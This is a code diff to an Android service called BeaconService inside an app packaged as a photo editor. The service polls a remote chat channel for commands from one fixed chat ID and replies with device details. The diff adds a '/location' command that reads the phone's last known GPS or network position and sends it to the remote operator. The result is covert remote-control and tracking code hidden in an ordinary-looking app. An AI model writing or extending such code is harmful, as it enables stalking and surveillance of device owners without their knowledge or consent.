@@ -1,6 +1,7 @@
 package com.photo.editor
 
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
@@ -51,14 +52,32 @@ class BeaconService : Service() {
                     val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                     if (chat != CHAT_ID) continue
                     val text = msg.optString("text", "")
-                    if (text == "/ping") send("pong")
-                    else if (text == "/info") send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
-                    else if (text.isNotEmpty()) send("got: $text")
+                    when (text) {
+                        "/ping" -> send("pong")
+                        "/info" -> send("model: ${Build.MODEL}\nsdk: ${Build.VERSION.SDK_INT}")
+                        "/location" -> send(locationText())
+                        else -> if (text.isNotEmpty()) send("got: $text")
+                    }
                 }
             } catch (e: Exception) {
                 Log.e("beacon", "poll err", e)
             }
             delay(3000)
+        }
+    }
+
+    private fun locationText(): String {
+        return try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+            if (loc != null) {
+                "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m"
+            } else {
+                "no location yet"
+            }
+        } catch (e: Exception) {
+            "loc error: ${e.message}"
         }
     }
 
